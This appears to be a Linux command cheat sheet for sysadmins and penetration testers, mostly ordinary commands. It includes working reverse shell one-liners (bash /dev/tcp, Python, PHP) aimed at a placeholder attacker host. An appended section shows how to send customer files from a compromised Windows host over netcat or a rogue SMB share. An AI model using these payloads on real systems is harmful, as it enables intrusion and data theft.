# The Ultimate Linux Commands Cheat Sheet (2026)

This master reference document outlines essential Linux command-line operations for System Administration and Penetration Testing. It incorporates production-grade methodologies and quick-reference syntax for environments ranging from local Homelabs to enterprise infrastructure.

## 1. Core System & File Operations
* `ls` - List directory contents.
* `ls -al` - Detailed list including hidden files, sizes, and permissions.
* `cd [dir]` - Navigate to directory.
* `cat > [file]` - Create and write standard input to a file.
* `mv [src] [dst]` - Move or rename a file/directory.
* `rm [file]` - Remove a file.
* `rm -rf [dir]` - Recursive force-delete of a directory (Use with extreme caution).
* `history` - List command execution history.
* `clear` - Clear terminal output.
* `mkdir [dir]` - Create a directory.
* `man [cmd]` - Open the manual page for a command.
* `sudo` - Execute commands with root/administrative privileges. // *sudo: Ejecuta comandos con privilegios de root/administrador.*

## 2. System Information
> Systems Specialist Insight: Use `systemd-detect-virt` to detect if the host is a VM or container instead of parsing dmesg.

* `uname -a` - Print full system info (kernel version, architecture).
* `lsb_release -a` - Display Distribution ID, release, and codename.
* `uptime` - Show system activity duration and load average.
* `hostname -I` - Display current IP addresses.
* `whoami` - Print current effective user context.

## 3. File Permissions & Security
> Systems Specialist Insight: Avoid `chmod -R 777`. Use `stat -c "%a" [file]` to inspect octal permissions accurately during security audits.

* `ls -l` - View detailed file permissions and ownership.
* `chown [u]:[g] [file]` - Change owner and group.
* `chmod 755 [file]` - Set permissions (Owner: rwx, Group/Others: r-x).
* `chgrp [group] [file]` - Change group ownership.
* `find / -perm -4000 2>/dev/null` - Pentesting: Search for files with SUID bit set.

## 4. Networking
> Systems Specialist Insight: Use `ip link show` to identify dynamic interface identifiers (e.g., ens33) before configuration.

* `ssh [user]@[ip]` - Establish remote connection.
* `ping [host]` - Verify connectivity via ICMP.
* `ip addr` - View network interface IP assignments.
* `dig [domain]` - Perform DNS lookups.
* `wget [url]` / `curl [url]` - Download files or interact with web services.
* `nc -lvnp [port]` - Pentesting: Netcat listener for shells/debugging.
* `ethtool [iface]` - Manage network driver/hardware settings.
* `ss -tulnp` - Faster socket stats (replaces netstat). // *ss -tulnp: Consulta el subsistema netlink del kernel.*

## 5. Archives & Compression
* `tar -cvf [file.tar] [dir]` - Create tar archive.
* `tar -xvf [file.tar]` - Extract tar archive.
* `tar -czvf [archive.tgz] [dir]` - Create Gzip-compressed archive.
* `gzip [file]` / `gunzip [file.gz]` - Compress/Decompress .gz files.
* `zip [archive.zip] [file]` / `unzip [archive.zip]` - Compress/Decompress .zip files.

## 6. Package Management
* `apt install [pkg]` - Install package (Debian/Ubuntu/Kali).
* `dnf install [pkg]` - Install package (RHEL/Fedora).
* `apt search [key]` / `yum search [key]` - Search repository.
* `dpkg -i [file.deb]` / `rpm -i [file.rpm]` - Install local package.

## 7. Search, Processing & Pipeline
* `grep [pattern] [file]` - Search text pattern.
* `grep -r [pattern] [dir]` - Recursive search.
* `find [path] -name [pattern]` - Find files matching pattern.
* `locate [name]` - Fast lookup.
* `tail -f [file]` - Follow log output in real-time.
* `awk '{print $1}' [file]` - Extract specific columns.
* `sed 's/old/new/g' [file]` - Find and replace text.
* `cut -d ':' -f 1 /etc/passwd` - Extract fields based on delimiter.

## 8. Disk Utilities & Storage
* `lsblk` - List all block devices.
* `fdisk -l` - Partition table details.
* `mount [dev] [dir]` / `umount [dir]` - Manage mount points.
* `df -i` - Inode report. Reveals filesystem structural nodes.

## 9. Process Management
* `top` / `htop` - Real-time monitoring.
* `ps aux` - Snapshot of all processes.
* `nice` / `renice` - Set execution priority.
* `free -h` - RAM/Swap stats.

## 10. Systemd & Service Management
* `systemctl status [service]` - Check service status.
* `systemctl start/stop [service]` - Change state.
* `systemctl restart [service]` - Restart service.
* `systemctl enable [service]` - Enable start on boot.
* `systemctl disable [service]` - Disable auto-start.
* `systemctl daemon-reload` - Reload configuration.

## 11. Log Management (Incident Handling)
* `journalctl -u [service]` - Logs for specific service.
* `journalctl -f` - Follow logs in real-time.
* `journalctl --since "1 hour ago"` - Filter by time.
* `journalctl -p err` - Show only error-level logs.

## 12. User & Identity Management
* `id [user]` - Show UID, GID, and groups.
* `groups [user]` - List user groups.
* `useradd -m [user]` - Create user with home.
* `usermod -aG [group] [user]` - Add user to group.
* `passwd [user]` - Update password.

## 13. Advanced Redirection & I/O
* `>` - Redirect output (overwrite).
* `>>` - Redirect output (append).
* `2>` - Redirect error output.
* `&>` - Redirect output and error.
* `|` - Pipeline (pipe output).
* `<` - Feed file content.

## 14. VIM Editor
* `i` - Insert mode.
* `ESC` - Normal mode.
* `:wq` (Save/Quit), `:q!` (Quit no save), `:set number` (Line numbers).
* `dd` (Delete line), `yy` (Copy), `p` (Paste).

## 15. Scripting & Environment
* `#!/bin/bash` - Shebang (Bash interpreter). // *Shebang: Especifica el intérprete.*
* `export [VAR]` - Set env variable.
* `alias [n]=[cmd]` - Command shortcut.
* `exit 0` - Success exit code.

## 16. Keyboard Shortcuts
* `Ctrl + C` - Interrupt process.
* `Ctrl + Z` - Suspend process.
* `Ctrl + R` - Search history.
* `!!` - Execute last command.
* `Ctrl + W` - Cut word.
* `Ctrl + L` - Clear screen.

## 17. Process & Identity Auditing (Incident Response)
* `w` - Shows logged-in users, idle time, and process activity.
* `who` - List users currently logged in.
* `last` - Log of last users/sessions.
* `ps -ef | grep [user]` - Processes owned by user.
* `ps -u [user] -o pid,user,group,cmd` - Custom process display.
* `pgrep -u [user]` - List PIDs owned by user.
* `kill [PID]` - SIGTERM (Graceful).
* `kill -9 [PID]` - SIGKILL (Forceful).
* `pkill -u [user]` - Kill all processes of a user.

## 18. Cronjobs & Scheduling (Automation & Persistence)
* `crontab -e` - Edit cron table for the current user.
* `crontab -l` - List cron jobs.
* `* * * * * [cmd]` - Syntax: (min hour dom mon dow).
* `systemctl list-timers` - Check systemd timers.

## 19. Firewall Management (Bastioning)
* `ufw status` - Check firewall state.
* `ufw allow [port]/[proto]` - Allow specific port (e.g., `ufw allow 22/tcp`).
* `ufw enable` - Activate firewall.
* `ufw delete [rule]` - Remove firewall rule.

## 20. SSH Key Management & Tunnels
* `ssh-keygen -t ed25519` - Generate secure SSH key pair.
* `ssh-copy-id [user]@[host]` - Copy public key to remote server.
* `ssh -L [local_port]:localhost:[remote_port] [user]@[host]` - Local Port Forwarding.
* `ssh -D [local_port] [user]@[host]` - Dynamic Port Forwarding (SOCKS Proxy).

### 21. Pentest: Reverse Shells (Payloads & Listeners)

**1. Setup the Listener (Attacker Machine)**
Always start the listener before executing the payload on the target to catch the incoming connection.
```bash
nc -lvnp <LPORT>
```

**2. Execute the Payload (Target Machine)**
Inject the appropriate payload based on the target environment. 

> **Legend:**
> * `<LHOST>`: Your attack machine IP (e.g., `tun0` interface).
> * `<LPORT>`: The port you opened on your listener.

**Option A: Bash (Standard Linux)**
```bash
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```

**Option B: Python3 (Reliable alternative if bash redirection fails)**
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

**Option C: PHP (Web Server / Command Injection via URL)**
```php
php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Appendix: Interactive VM Verification
```text
# Disk Usage
$ df -h /
# Memory Status
$ free -h
# Network Interfaces
$ ip -brief address show
```
# Post-Exploitation: Data Exfiltration (Windows to Linux)

During the post-exploitation phase, extracting sensitive data (e.g., `customer.csv`, configuration files, or database dumps) from a compromised Windows host to the attacker's Kali Linux machine is a critical objective. Below are two highly effective methodologies.

## Method 1: The Netcat Pipeline (TCP Exfiltration)
If a valid Windows PE Netcat binary (`nc.exe`) is already staged on the target, it can be utilized for seamless data transfer over pure TCP.

**Step 1: Prepare the Listener (Kali Linux - Receiver)**
Set up Netcat to listen on a designated port and redirect the incoming stream into an empty file.
```bash
# Execute on the attacker machine
nc -lvnp 9001 > customer.csv
```

**Step 2: Push the File (Windows Target - Sender)**
From the compromised Windows shell (CMD), pipe or redirect the target file's contents into the Netcat connection.
```cmd
# Execute on the compromised Windows host
C:\Temp\nc.exe <KALI_IP> 9001 < customer.csv
```
*(Note: Press `Ctrl+C` on the Kali listener after a few seconds once the file transfer is complete).*

## Method 2: SMB Share via Impacket (Living off the Land)
This is the most reliable and stealthy method, as it leverages the native Windows SMB protocol (Server Message Block). By hosting a rogue SMB share on the attacker machine, we can exfiltrate files using standard Windows `copy` commands.

**Step 1: Host the SMB Server (Kali Linux)**
Use the Impacket library to create an unauthenticated SMB share pointing to your current working directory. The `-smb2support` flag is mandatory for compatibility with modern Windows environments (Windows 10/Server 2016+).
```bash
# Execute on the attacker machine
sudo impacket-smbserver exfil $(pwd) -smb2support
```

**Step 2: Copy the File (Windows Target)**
Treat the attacker machine as a standard network drive and copy the file directly. No authentication is required.
```cmd
# Execute on the compromised Windows host
copy customer.csv \\<KALI_IP>\exfil\
```
*(Result: The file will appear instantly in your Kali working directory, and the Impacket terminal will log the successful connection).*